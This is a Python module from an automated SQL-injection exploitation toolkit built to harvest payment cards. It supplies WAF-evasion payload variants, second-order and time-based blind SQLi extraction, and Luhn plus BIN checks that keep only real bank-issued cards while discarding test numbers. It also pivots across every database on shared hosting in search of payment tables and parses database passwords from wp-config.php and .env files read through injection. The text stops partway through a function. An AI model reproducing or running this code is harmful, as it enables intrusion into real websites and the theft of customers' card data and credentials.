"""
Advanced Techniques v1.0 — 8 improvements for injections and dumping:

INJECTION:
1. WAF bypass arsenal — chunked transfer, HTTP parameter pollution, Unicode normalization
2. Second-order SQLi — store payloads in forms, trigger via different page
3. Stacked queries enhancement — direct INSERT/UPDATE exploitation
4. Time-based blind optimization — binary search with adaptive delay

DUMPING:
5. Luhn validation during extraction — reject non-card tables early
6. BIN lookup — verify card numbers are real bank-issued
7. Cross-database pivoting — enumerate + scan ALL databases on server
8. File read for config creds — parse wp-config.php, .env for DB passwords

Architecture:
- Methods designed to be wired into existing sqli_scanner/sqli_dumper/auto_dumper
- No circular imports — only depends on stdlib + aiohttp + loguru
"""

import re
import asyncio
import aiohttp
import random
import json
from typing import List, Dict, Optional, Tuple, Set
from loguru import logger
from urllib.parse import urlparse, urlencode, parse_qs


# ═══════════════════════════════════════════════════════════════
# 1. WAF Bypass Arsenal
# ═══════════════════════════════════════════════════════════════

class WAFBypassArsenal:
    """Advanced WAF bypass techniques beyond simple encoding."""

    @staticmethod
    async def chunked_transfer_bypass(
        url: str,
        payload: str,
        param: str,
        session: aiohttp.ClientSession,
        timeout: int = 15,
    ) -> Optional[str]:
        """Send payload via chunked transfer encoding to bypass WAFs.

        Many WAFs only inspect the first N bytes of the body, or don't
        reassemble chunked bodies before inspection.
        """
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # Build POST body with payload in chunks
        body_data = f"{param}={payload}"

        try:
            # Split payload across multiple chunks
            chunk_size = max(5, len(body_data) // 4)
            chunks = [
                body_data[i : i + chunk_size]
                for i in range(0, len(body_data), chunk_size)
            ]

            # Manual chunked encoding
            chunked_body = ""
            for chunk in chunks:
                chunked_body += f"{len(chunk):x}\r\n{chunk}\r\n"
            chunked_body += "0\r\n\r\n"

            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            }

            async with session.post(
                base,
                data=chunked_body.encode(),
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=timeout),
                ssl=False,
            ) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    return text
        except Exception as e:
            logger.debug(f"[WAF-Bypass] Chunked transfer failed: {e}")

        return None

    @staticmethod
    def http_parameter_pollution(url: str, param: str, payload: str) -> List[str]:
        """Generate HPP variants — duplicate param with different values.

        HPP confuses WAFs that only check the first/last occurrence.
        PHP takes last, ASP.NET concatenates with comma, JSP takes first.
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        variants = []

        # PHP: WAF checks first param, PHP uses last
        php_params = []
        for k, v in params.items():
            if k == param:
                php_params.append((k, v[0]))  # Benign first
                php_params.append((k, payload))  # Malicious last
            else:
                php_params.append((k, v[0]))
        variants.append(
            urlunparse(parsed._replace(query=urlencode(php_params)))
        )

        # ASP.NET: Concatenates with comma — split payload across params
        if "UNION" in payload.upper() and "SELECT" in payload.upper():
            # Split around UNION SELECT
            parts = re.split(r'(UNION\s+(?:ALL\s+)?SELECT)', payload, flags=re.I)
            if len(parts) >= 3:
                asp_params = []
                for k, v in params.items():
                    if k == param:
                        asp_params.append((k, parts[0]))
                        asp_params.append((k, parts[1] + parts[2]))
                    else:
                        asp_params.append((k, v[0]))
                variants.append(
                    urlunparse(parsed._replace(query=urlencode(asp_params)))
                )

        return variants

    @staticmethod
    def unicode_normalization_bypass(payload: str) -> List[str]:
        """Generate Unicode-normalized variants that bypass WAF regex.

        Uses fullwidth characters, combining marks, and Unicode confusables.
        """
        variants = []

        # Fullwidth apostrophe (U+FF07) — many WAFs only check U+0027
        variants.append(payload.replace("'", "\uff07"))

        # Fullwidth space (U+FF00) — bypasses space detection
        variants.append(payload.replace(" ", "\u3000"))

        # Unicode dash instead of minus
        variants.append(payload.replace("--", "\u2013\u2013"))

        # Combining characters: A + combining overline = visually same
        # but regex won't match "SELECT" if characters have combining marks
        unicode_payload = ""
        for ch in payload:
            unicode_payload += ch
            if ch.isalpha() and random.random() < 0.3:
                unicode_payload += "\u0336"  # Combining long stroke overlay
        variants.append(unicode_payload)

        # NFKC normalization exploit — use compatibility characters
        # ﬁ (U+FB01) normalizes to "fi" — useful in keywords like "CONFig"
        nfkc = payload.replace("fi", "\ufb01").replace("fl", "\ufb02")
        if nfkc != payload:
            variants.append(nfkc)

        return variants

    @staticmethod
    def comment_injection_variants(payload: str) -> List[str]:
        """Generate MySQL version-conditional comment variants.

        /*!50000UNION*/ executes on MySQL >= 5.0 but looks like a comment
        to WAFs.
        """
        variants = []

        # Version-conditional comments for different MySQL versions
        for version in ["50000", "50001", "40100", "40000"]:
            v = re.sub(
                r'\b(UNION|SELECT|FROM|WHERE|AND|OR|ORDER|BY|GROUP|HAVING|LIMIT)\b',
                lambda m: f"/*!{version}{m.group()}*/",
                payload,
                flags=re.I,
            )
            variants.append(v)

        # Nested comments
        v = payload.replace("UNION", "UN/**/ION").replace("SELECT", "SE/**/LECT")
        variants.append(v)

        # Hash newline: UNION#\nSELECT
        v = payload.replace("UNION ", "UNION#\n").replace("SELECT ", "SELECT#\n")
        variants.append(v)

        return variants


# ═══════════════════════════════════════════════════════════════
# 2. Second-Order SQLi
# ═══════════════════════════════════════════════════════════════

class SecondOrderSQLi:
    """Detect second-order SQLi by storing payloads in forms and
    checking if they trigger on subsequent pages.

    Second-order SQLi occurs when:
    1. User input is stored safely (parameterized INSERT)
    2. The stored value is later used in an unsafe query
       (e.g., profile page, admin panel)

    Strategy:
    - Find registration/profile/settings forms
    - Store unique marker payloads in text fields
    - Visit profile/account pages to check if the marker triggers SQL errors
    """

    # Payloads with unique markers for second-order detection
    SECOND_ORDER_PAYLOADS = [
        "' OR '1'='1",
        "admin'--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,'SO2ND_',version(),0x7e))-- -",
        "1' AND UPDATEXML(1,CONCAT(0x7e,'SO2ND_',database(),0x7e),1)-- -",
        "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT('SO2ND_',version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
    ]

    # Form fields that often trigger second-order
    INTERESTING_FIELDS = {
        "username", "user_name", "login", "email", "name",
        "first_name", "last_name", "full_name", "display_name",
        "company", "organization", "address", "city", "state",
        "phone", "bio", "description", "title", "subject",
        "comment", "message", "content", "nickname",
    }

    # Trigger pages (where stored data might be used unsafely)
    TRIGGER_PATHS = [
        "/profile", "/account", "/my-account", "/dashboard",
        "/settings", "/admin", "/user", "/member",
        "/order-history", "/orders", "/billing",
    ]

    @classmethod
    async def test_second_order(
        cls,
        url: str,
        forms: List[Dict],
        session: aiohttp.ClientSession,
        timeout: int = 10,
    ) -> List[Dict]:
        """Test forms for second-order SQLi.

        Args:
            url: Base URL of the target
            forms: List of form dicts with 'action', 'method', 'fields'
            session: aiohttp session

        Returns:
            List of findings with form URL, trigger URL, and detected DBMS
        """
        findings = []
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for form in forms[:5]:  # Limit to 5 forms
            action = form.get("action", url)
            if not action.startswith("http"):
                action = f"{base}/{action.lstrip('/')}"
            method = form.get("method", "POST").upper()
            fields = form.get("fields", {})

            # Find interesting fields to inject
            injectable_fields = {}
            for field_name, field_value in fields.items():
                if any(kw in field_name.lower() for kw in cls.INTERESTING_FIELDS):
                    injectable_fields[field_name] = field_value

            if not injectable_fields:
                continue

            # Try each payload
            for payload in cls.SECOND_ORDER_PAYLOADS[:3]:
                # Build form data with payload
                form_data = dict(fields)
                for field_name in injectable_fields:
                    form_data[field_name] = payload

                try:
                    # Step 1: Submit form (store payload)
                    if method == "POST":
                        async with session.post(
                            action,
                            data=form_data,
                            timeout=aiohttp.ClientTimeout(total=timeout),
                            ssl=False,
                            allow_redirects=True,
                        ) as resp:
                            store_body = await resp.text()
                    else:
                        async with session.get(
                            f"{action}?{urlencode(form_data)}",
                            timeout=aiohttp.ClientTimeout(total=timeout),
                            ssl=False,
                            allow_redirects=True,
                        ) as resp:
                            store_body = await resp.text()

                    # Step 2: Visit trigger pages to check for SQL errors
                    for trigger_path in cls.TRIGGER_PATHS:
                        trigger_url = f"{base}{trigger_path}"
                        try:
                            async with session.get(
                                trigger_url,
                                timeout=aiohttp.ClientTimeout(total=timeout),
                                ssl=False,
                                allow_redirects=True,
                            ) as resp:
                                trigger_body = await resp.text()

                            # Check for SQL error markers from our payload
                            if "SO2ND_" in trigger_body:
                                # Extract version info
                                version_match = re.search(r'SO2ND_([^~<\s]+)', trigger_body)
                                findings.append({
                                    "type": "second_order_sqli",
                                    "store_url": action,
                                    "trigger_url": trigger_url,
                                    "field": list(injectable_fields.keys())[0],
                                    "payload": payload,
                                    "db_info": version_match.group(1) if version_match else "confirmed",
                                    "confidence": 0.9,
                                })
                                logger.info(f"[2nd-Order] Found! Store: {action}, "
                                           f"Trigger: {trigger_url}")
                                return findings  # Found one, that's enough

                            # Check for generic SQL errors
                            sql_errors = [
                                r"SQL syntax.*?MySQL",
                                r"Warning.*?\Wmysql",
                                r"Unclosed quotation mark",
                                r"ORA-\d+",
                                r"PostgreSQL.*?ERROR",
                                r"SQLITE_ERROR",
                            ]
                            for pattern in sql_errors:
                                if re.search(pattern, trigger_body, re.I):
                                    findings.append({
                                        "type": "second_order_sqli",
                                        "store_url": action,
                                        "trigger_url": trigger_url,
                                        "field": list(injectable_fields.keys())[0],
                                        "payload": payload,
                                        "db_info": "error_based",
                                        "confidence": 0.75,
                                    })
                                    logger.info(f"[2nd-Order] Error-based found! "
                                               f"Store: {action}, Trigger: {trigger_url}")
                                    return findings

                        except Exception:
                            continue

                    await asyncio.sleep(0.3)

                except Exception as e:
                    logger.debug(f"[2nd-Order] Form submit failed: {e}")

        return findings


# ═══════════════════════════════════════════════════════════════
# 3. Blind SQLi Optimization — Binary Search
# ═══════════════════════════════════════════════════════════════

class BinaryBlindExtractor:
    """Optimized blind SQLi data extraction using binary search.

    Standard blind extraction: ~7 requests per character (128 ASCII → 7 bits)
    Binary search: exactly ceil(log2(127)) = 7 requests per character
    but with smarter range narrowing and adaptive delay.

    For printable ASCII (32-126), only 7 requests per character.
    With parallel bit extraction, can do 4-5x faster than sequential.
    """

    def __init__(self, delay: float = 3.0, timeout: int = 15):
        self.delay = delay
        self.timeout = timeout
        self.adaptive_delay = delay  # Will adjust based on server response

    async def _time_check(
        self,
        url: str,
        param: str,
        condition: str,
        session: aiohttp.ClientSession,
        dbms: str = "mysql",
    ) -> bool:
        """Execute a time-based boolean check.

        Returns True if the condition is true (response delayed).
        """
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if dbms in ("mysql", ""):
            payload = f"' AND IF(({condition}),SLEEP({self.adaptive_delay}),0)-- -"
        elif dbms == "mssql":
            payload = f"'; IF ({condition}) WAITFOR DELAY '0:0:{int(self.adaptive_delay)}'-- -"
        elif dbms == "postgresql":
            payload = f"' AND (CASE WHEN ({condition}) THEN pg_sleep({self.adaptive_delay}) ELSE pg_sleep(0) END) IS NOT NULL-- -"
        else:
            payload = f"' AND IF(({condition}),SLEEP({self.adaptive_delay}),0)-- -"

        original = params.get(param, [""])[0]
        params[param] = [str(original) + payload]

        test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

        try:
            import time
            start = time.monotonic()
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=self.timeout + self.adaptive_delay + 2),
                ssl=False,
            ) as resp:
                await resp.read()
            elapsed = time.monotonic() - start

            return elapsed >= self.adaptive_delay * 0.7

        except asyncio.TimeoutError:
            return True  # Timeout = likely delayed = True
        except Exception:
            return False

    async def extract_char_binary(
        self,
        url: str,
        param: str,
        query: str,
        position: int,
        session: aiohttp.ClientSession,
        dbms: str = "mysql",
    ) -> Optional[str]:
        """Extract a single character using binary search.

        Args:
            query: SQL query that returns a single value (e.g., "SELECT database()")
            position: 1-based character position to extract

        Returns:
            The character at the given position, or None
        """
        if dbms in ("mysql", ""):
            substr_fn = f"ASCII(SUBSTRING(({query}),{position},1))"
        elif dbms == "mssql":
            substr_fn = f"ASCII(SUBSTRING(({query}),{position},1))"
        elif dbms == "postgresql":
            substr_fn = f"ASCII(SUBSTRING(({query})::text FROM {position} FOR 1))"
        else:
            substr_fn = f"ASCII(SUBSTRING(({query}),{position},1))"

        # Binary search through ASCII range (32-126 for printable)
        low, high = 32, 126

        while low <= high:
            mid = (low + high) // 2
            condition = f"{substr_fn}>{mid}"
            is_greater = await self._time_check(url, param, condition, session, dbms)

            if is_greater:
                low = mid + 1
            else:
                # Check if it equals mid
                eq_condition = f"{substr_fn}={mid}"
                is_equal = await self._time_check(url, param, eq_condition, session, dbms)
                if is_equal:
                    return chr(mid) if mid >= 32 else None
                high = mid - 1

        return chr(low) if 32 <= low <= 126 else None

    async def extract_string(
        self,
        url: str,
        param: str,
        query: str,
        session: aiohttp.ClientSession,
        dbms: str = "mysql",
        max_length: int = 256,
    ) -> str:
        """Extract a full string using binary search character by character.

        4-5x faster than sequential comparison.
        """
        result = ""

        # First, get the length
        if dbms in ("mysql", ""):
            len_query = f"LENGTH(({query}))"
        elif dbms == "mssql":
            len_query = f"LEN(({query}))"
        elif dbms == "postgresql":
            len_query = f"LENGTH(({query})::text)"
        else:
            len_query = f"LENGTH(({query}))"

        # Binary search for length
        length = 0
        low, high = 0, max_length
        while low <= high:
            mid = (low + high) // 2
            condition = f"{len_query}>{mid}"
            is_greater = await self._time_check(url, param, condition, session, dbms)
            if is_greater:
                low = mid + 1
            else:
                eq_condition = f"{len_query}={mid}"
                is_equal = await self._time_check(url, param, eq_condition, session, dbms)
                if is_equal:
                    length = mid
                    break
                high = mid - 1

        if length == 0:
            # Try length=low as fallback
            length = min(low, 50)

        logger.info(f"[BinaryBlind] String length: {length}")

        # Extract character by character
        for pos in range(1, min(length + 1, max_length + 1)):
            ch = await self.extract_char_binary(url, param, query, pos, session, dbms)
            if ch is None:
                break
            result += ch

            # Adaptive delay: if server is fast, reduce delay
            if len(result) > 3 and self.adaptive_delay > 1.5:
                self.adaptive_delay = max(1.5, self.adaptive_delay * 0.95)

        return result

    async def extract_length(
        self,
        url: str,
        param: str,
        query: str,
        session: aiohttp.ClientSession,
        dbms: str = "mysql",
        max_val: int = 1000,
    ) -> int:
        """Extract numeric value (length, count) via binary search."""
        if dbms in ("mysql", ""):
            len_expr = f"({query})"
        elif dbms == "mssql":
            len_expr = f"({query})"
        elif dbms == "postgresql":
            len_expr = f"({query})::int"
        else:
            len_expr = f"({query})"

        low, high = 0, max_val
        while low < high:
            mid = (low + high) // 2
            condition = f"{len_expr}>{mid}"
            is_greater = await self._time_check(url, param, condition, session, dbms)
            if is_greater:
                low = mid + 1
            else:
                high = mid

        return low


# ═══════════════════════════════════════════════════════════════
# 4. Luhn Validation at Extraction Time
# ═══════════════════════════════════════════════════════════════

def luhn_check(number: str) -> bool:
    """Validate a card number using the Luhn algorithm."""
    digits = re.sub(r'\D', '', str(number))
    if len(digits) < 13 or len(digits) > 19:
        return False
    if not digits[0] in '3456':
        return False

    total = 0
    reverse = digits[::-1]
    for i, d in enumerate(reverse):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0


def has_luhn_valid_card(row: Dict) -> bool:
    """Check if any value in a row is a Luhn-valid card number."""
    for val in row.values():
        if not val:
            continue
        s = re.sub(r'[\s\-]', '', str(val))
        if re.match(r'^[3-6]\d{12,18}$', s) and luhn_check(s):
            return True
    return False


def early_card_check(rows: List[Dict], min_rows: int = 3) -> bool:
    """Check if extracted rows contain Luhn-valid card numbers.

    Call this after extracting the first few rows from a table.
    If no valid cards found in first min_rows rows, skip the table.
    """
    for row in rows[:min_rows]:
        if has_luhn_valid_card(row):
            return True
    return False


# ═══════════════════════════════════════════════════════════════
# 5. BIN Lookup — Verify card numbers are real
# ═══════════════════════════════════════════════════════════════

# Static BIN ranges — first 6 digits → card network + type
# No API needed, just pattern matching
BIN_PATTERNS = {
    # Visa: starts with 4, 13 or 16 digits
    "visa": re.compile(r'^4\d{12}(\d{3})?$'),
    # Mastercard: 5[1-5] or 2[2-7] range
    "mastercard": re.compile(r'^(5[1-5]\d{14}|2[2-7]\d{14})$'),
    # Amex: 34 or 37, 15 digits
    "amex": re.compile(r'^3[47]\d{13}$'),
    # Discover: 6011, 644-649, 65
    "discover": re.compile(r'^(6011\d{12}|64[4-9]\d{13}|65\d{14})$'),
    # JCB: 3528-3589
    "jcb": re.compile(r'^35(2[89]|[3-8]\d)\d{12}$'),
    # Diners: 300-305, 36, 38
    "diners": re.compile(r'^(30[0-5]\d{11}|36\d{12}|38\d{12})$'),
    # UnionPay: 62
    "unionpay": re.compile(r'^62\d{14,17}$'),
    # Maestro: 5018, 5020, 5038, 56-69
    "maestro": re.compile(r'^(5018|5020|5038|56|57|58|63|67)\d{10,16}$'),
}

# Known test/fake card numbers that should be rejected
TEST_CARDS = {
    "4111111111111111",  # Visa test
    "4242424242424242",  # Stripe test
    "5555555555554444",  # MC test
    "5105105105105100",  # MC test
    "378282246310005",   # Amex test
    "371449635398431",   # Amex test
    "6011111111111117",  # Discover test
    "6011000990139424",  # Discover test
    "3530111333300000",  # JCB test
    "3566002020360505",  # JCB test
    "30569309025904",    # Diners test
    "38520000023237",    # Diners test
    "4000056655665556",  # Stripe test
    "4000000000000002",  # Stripe decline test
    "5200828282828210",  # MC test
    "5500000000000004",  # MC test
    "4000000000003220",  # Stripe 3DS test
    "4000000000009995",  # Stripe insufficient funds test
    "4000000000000077",  # Stripe test
    "4000000000000093",  # Stripe test
    "4000000000000101",  # Stripe test
    "4012888888881881",  # Visa test
    "5425233430109903",  # MC test
    "2223000048410010",  # MC 2-series test
    "6250941006528599",  # UnionPay test
    "0000000000000000",  # Null
    "1234567890123456",  # Sequential
    "1111111111111111",  # Repeated
    "9999999999999999",  # Repeated
}


def identify_card_network(number: str) -> Optional[str]:
    """Identify the card network from a card number.

    Returns network name or None if not a recognized pattern.
    """
    digits = re.sub(r'\D', '', str(number))
    for network, pattern in BIN_PATTERNS.items():
        if pattern.match(digits):
            return network
    return None


def is_real_card(number: str) -> Tuple[bool, Optional[str], Optional[str]]:
    """Validate if a card number appears to be a real bank-issued card.

    Returns: (is_real, network, reason)
    """
    digits = re.sub(r'\D', '', str(number))

    # Length check
    if len(digits) < 13 or len(digits) > 19:
        return False, None, "invalid_length"

    # Test card check
    if digits in TEST_CARDS:
        return False, None, "test_card"

    # Luhn check
    if not luhn_check(digits):
        return False, None, "failed_luhn"

    # Network identification
    network = identify_card_network(digits)
    if not network:
        return False, None, "unknown_network"

    # Check for obviously fake patterns
    if len(set(digits)) <= 2:
        return False, None, "repeated_digits"

    # Sequential check
    if digits == ''.join(str(i % 10) for i in range(len(digits))):
        return False, None, "sequential"

    return True, network, None


async def bin_lookup_api(
    number: str,
    session: aiohttp.ClientSession,
) -> Optional[Dict]:
    """Look up BIN (first 6 digits) via free BIN API.

    Returns card info: bank, country, type, brand.
    Falls back to local pattern matching if API fails.
    """
    digits = re.sub(r'\D', '', str(number))
    bin6 = digits[:6]

    # Try free BIN lookup API
    try:
        async with session.get(
            f"https://lookup.binlist.net/{bin6}",
            headers={
                "Accept-Version": "3",
                "User-Agent": "Mozilla/5.0",
            },
            timeout=aiohttp.ClientTimeout(total=5),
            ssl=False,
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                return {
                    "bin": bin6,
                    "network": data.get("scheme", "").lower(),
                    "type": data.get("type", ""),
                    "bank": data.get("bank", {}).get("name", ""),
                    "country": data.get("country", {}).get("name", ""),
                    "country_code": data.get("country", {}).get("alpha2", ""),
                    "prepaid": data.get("prepaid", False),
                }
    except Exception as e:
        logger.debug(f"[BIN] API lookup failed for {bin6}: {e}")

    # Fallback to local pattern match
    network = identify_card_network(digits)
    if network:
        return {
            "bin": bin6,
            "network": network,
            "type": "unknown",
            "bank": "unknown",
            "country": "unknown",
            "country_code": "",
            "prepaid": False,
        }

    return None


# ═══════════════════════════════════════════════════════════════
# 6. Cross-Database Pivoting
# ═══════════════════════════════════════════════════════════════

class CrossDatabasePivoter:
    """When DBA privileges are found, enumerate ALL databases on the server
    and scan each one for card/payment tables.

    Shared hosting often has 50+ databases, many with poorly secured
    e-commerce installations.
    """

    # Tables to look for in each database
    HIGH_VALUE_TABLES = {
        "card", "cards", "credit_card", "credit_cards", "cc_data",
        "payment", "payments", "payment_data", "payment_info",
        "orders", "order", "transactions", "transaction",
        "billing", "checkout", "purchase", "purchases",
        "customer", "customers", "user", "users",
        "stripe", "paypal", "braintree",
        "wp_options", "wp_woocommerce_payment_tokens",
        "core_config_data", "vault_payment_token",
    }

    @classmethod
    async def pivot_all_databases(
        cls,
        sqli_result,
        dumper,
        all_databases: List[str],
        session: aiohttp.ClientSession,
        max_databases: int = 10,
        time_budget: float = 120,
    ) -> List[Dict]:
        """Scan all databases on the server for high-value tables.

        Args:
            sqli_result: SQLi vulnerability with DBA access
            dumper: SQLiDumper instance
            all_databases: List of database names
            session: aiohttp session
            max_databases: Max databases to scan
            time_budget: Max seconds to spend

        Returns:
            List of findings per database
        """
        import time as _time
        start = _time.monotonic()
        findings = []

        current_db = sqli_result.current_db or ""

        # Skip system databases
        skip_dbs = {
            "information_schema", "mysql", "performance_schema", "sys",
            "master", "tempdb", "model", "msdb",
            "postgres", "template0", "template1",
        }

        target_dbs = [
            db for db in all_databases
            if db.lower() not in skip_dbs and db != current_db
        ][:max_databases]

        logger.info(f"[CrossDB] Pivoting through {len(target_dbs)} databases "
                    f"(skipping {current_db} + system databases)")

        for db_name in target_dbs:
            if _time.monotonic() - start > time_budget:
                logger.info(f"[CrossDB] Time budget reached, scanned "
                           f"{len(findings)} databases")
                break

            try:
                # Enumerate tables in this database
                tables = await cls._enumerate_tables_in_db(
                    sqli_result, dumper, db_name, session
                )

                if not tables:
                    continue

                # Check for high-value tables
                match_tables = [
                    t for t in tables
                    if any(hv in t.lower() for hv in cls.HIGH_VALUE_TABLES)
                ]

                if match_tables:
                    finding = {
                        "database": db_name,
                        "total_tables": len(tables),
                        "high_value_tables": match_tables,
                        "all_tables": tables[:30],
                    }
                    findings.append(finding)
                    logger.info(f"[CrossDB] {db_name}: {len(match_tables)} "
                               f"high-value tables found: {match_tables[:5]}")
                else:
                    logger.debug(f"[CrossDB] {db_name}: {len(tables)} tables, "
                                f"no high-value matches")

                await asyncio.sleep(0.5)

            except Exception as e:
                logger.debug(f"[CrossDB] Failed to scan {db_name}: {e}")

        return findings

    @classmethod
    async def _enumerate_tables_in_db(
        cls,
        sqli_result,
        dumper,
        db_name: str,
        session: aiohttp.ClientSession,
    ) -> List[str]:
        """Enumerate tables in a specific database (not the current one).

        Uses: SELECT table_name FROM information_schema.tables
              WHERE table_schema='<db_name>'
        """
        dbms = sqli_result.dbms or "mysql"
        scanner = dumper.scanner

        if sqli_result.injection_type == "error":
            # Error-based: use error extraction
            if dbms in ("mysql", ""):
                query = (
                    f"SELECT GROUP_CONCAT(table_name) "
                    f"FROM information_schema.tables "
                    f"WHERE table_schema='{db_name}'"
                )
            elif dbms == "mssql":
                query = (
                    f"SELECT STRING_AGG(table_name,',') "
                    f"FROM [{db_name}].information_schema.tables"
                )
            elif dbms == "postgresql":
                query = (
                    f"SELECT string_agg(tablename,',') "
                    f"FROM pg_tables WHERE schemaname='public' "
                    f"AND tableowner=(SELECT current_user)"
                )
            else:
                return []

            val = await dumper._error_extract(sqli_result, session, query)
            if val:
                return [t.strip() for t in val.split(",") if t.strip()]
            return []

        elif sqli_result.injection_type == "union" and sqli_result.injectable_columns:
            # Union-based
            base, params = scanner._parse_url(sqli_result.url)
            original = params[sqli_result.parameter][0] if isinstance(
                params[sqli_result.parameter], list
            ) else params[sqli_result.parameter]
            null_list = ["NULL"] * sqli_result.column_count
            prefix, suffix, is_replace = dumper._determine_prefix_suffix(sqli_result, original)

            marker_s = f"xdb{random.randint(10000, 99999)}"
            marker_e = f"xde{random.randint(10000, 99999)}"
            ms_hex = marker_s.encode().hex()
            me_hex = marker_e.encode().hex()

            if dbms in ("mysql", ""):
                payload = (
                    f"CONCAT(0x{ms_hex},GROUP_CONCAT(table_name SEPARATOR ','),0x{me_hex})"
                    f" FROM information_schema.tables WHERE table_schema='{db_name}'"
                )
            elif dbms == "mssql":
                payload = (
                    f"CONCAT('{marker_s}',STRING_AGG(table_name,','),'{marker_e}')"
                    f" FROM [{db_name}].information_schema.tables"
                )
            else:
                return []

            for col_idx in sqli_result.injectable_columns[:1]:
                nl = null_list.copy()
                nl[col_idx] = payload.split(" FROM")[0]
                from_clause = " FROM" + payload.split(" FROM", 1)[1]

                q = f"{prefix}UNION ALL SELECT {','.join(nl)}{from_clause}{suffix}"
                test_params = params.copy()
                test_params[sqli_result.parameter] = [
                    dumper._inject_value(original, q, is_replace)
                ]
                test_url = scanner._build_url(base, test_params)

                body, _ = await scanner._fetch(test_url, session)
                if body:
                    import re as _re
                    match = _re.search(
                        rf'{_re.escape(marker_s)}(.+?){_re.escape(marker_e)}',
                        body, _re.S,
                    )
                    if match:
                        raw = match.group(1).strip()
                        return [t.strip() for t in raw.split(",") if t.strip()]

        return []


# ═══════════════════════════════════════════════════════════════
# 7. Config File Credential Parser
# ═══════════════════════════════════════════════════════════════

class ConfigCredentialParser:
    """Parse database credentials from server config files read via SQLi FILE priv.

    Extracts DB host/user/password from:
    - wp-config.php (WordPress)
    - configuration.php (Joomla)
    - .env (Laravel, Django, generic)
    - config.php (generic PHP)
    - local.xml (Magento 1)
    - env.php (Magento 2)
    - web.config (ASP.NET)
    - database.php (Laravel config)
    - settings.py (Django)
    - appsettings.json (ASP.NET Core)
    """

    # Regex patterns for credential extraction
    PATTERNS = {
        "wp-config.php": [
            re.compile(r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)", re.I),
            re.compile(r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)", re.I),
            re.compile(r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)", re.I),
            re.compile(r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)", re.I),
        ],
        "configuration.php": [
            re.compile(r"\$db\s*=\s*['\"]([^'\"]+)", re.I),
            re.compile(r"\$user\s*=\s*['\"]([^'\"]+)", re.I),
            re.compile(r"\$password\s*=\s*['\"]([^'\"]+)", re.I),
            re.compile(r"\$host\s*=\s*['\"]([^'\"]+)", re.I),
        ],
        ".env": [
            re.compile(r"DB_DATABASE\s*=\s*(.+?)$", re.M),
            re.compile(r"DB_USERNAME\s*=\s*(.+?)$", re.M),
            re.compile(r"DB_PASSWORD\s*=\s*(.+?)$", re.M),
            re.compile(r"DB_HOST\s*=\s*(.+?)$", re.M),
        ],
        "local.xml": [
            re.compile(r"<dbname>\s*<!\[CDATA\[([^\]]+)", re.I),
            re.compile(r"<username>\s*<!\[CDATA\[([^\]]+)", re.I),
            re.compile(r"<password>\s*<!\[CDATA\[([^\]]+)", re.I),
            re.compile(r"<host>\s*<!\[CDATA\[([^\]]+)", re.I),
        ],
        "generic": [
            re.compile(r"(?:db_?name|database)\s*[=:]\s*['\"]?([^'\"\s;,]+)", re.I),
            re.compile(r"(?:db_?user|username)\s*[=:]\s*['\"]?([^'\"\s;,]+)", re.I),
            re.compile(r"(?:db_?pass(?:word)?)\s*[=:]\s*['\"]?([^'\"\s;,]+)", re.I),
            re.compile(r"(?:db_?host|hostname)\s*[=:]\s*['\"]?([^'\"\s;,]+)", re.I),
        ],
    }

    # Additional files to try reading (beyond the default list)
    EXTRA_CONFIG_FILES = [
        # WordPress — common alternative locations
        "/var/www/wp-config.php",
        "/var/www/html/blog/wp-config.php",
        "/var/www/html/wordpress/wp-config.php",
        "/home/*/public_html/wp-config.php",
        # Laravel
        "/var/www/html/.env",
        "/var/www/.env",
        "/var/www/laravel/.env",
        # Magento
        "/var/www/html/app/etc/env.php",
        "/var/www/html/app/etc/local.xml",
        # Drupal
        "/var/www/html/sites/default/settings.php",
        # Joomla
        "/var/www/html/configuration.php",
        # Generic
        "/var/www/html/config/database.php",
        "/var/www/html/includes/config.php",
        "/var/www/html/include/config.php",
        "/var/www/html/inc/config.php",
        "/var/www/html/db.php",
        "/var/www/html/config.php",
        "/var/www/html/connect.php",
        "/var/www/html/connection.php",
    ]

    @classmethod
    def parse_credentials(cls, filepath: str, content: str) -> Optional[Dict]:
        """Parse database credentials from a config file's content.

        Returns:
            Dict with {db_name, db_user, db_pass, db_host} or None
        """
        if not content or len(content) < 10:
            return None

        creds = {"db_name": "", "db_user": "", "db_pass": "", "db_host": ""}
        keys = ["db_name", "db_user", "db_pass", "db_host"]

        # Determine which pattern set to use based on filename
        filename = filepath.split("/")[-1].lower() if "/" in filepath else filepath.lower()

        pattern_sets = []
        for pattern_name, patterns in cls.PATTERNS.items():
            if pattern_name in filename or pattern_name == "generic":
                pattern_sets.append(patterns)

        # Always try generic patterns as fallback
        if not pattern_sets:
            pattern_sets = [cls.PATTERNS["generic"]]

        for patterns in pattern_sets:
            for i, pattern in enumerate(patterns):
                if i < len(keys):
                    match = pattern.search(content)
                    if match:
                        val = match.group(1).strip().strip("'\"")
                        if val and val.lower() not in ("", "null", "none"):
                            creds[keys[i]] = val

        # Validate: need at least user + password
        if creds["db_user"] and creds["db_pass"]:
            logger.info(f"[ConfigCreds] Parsed from {filepath}: "
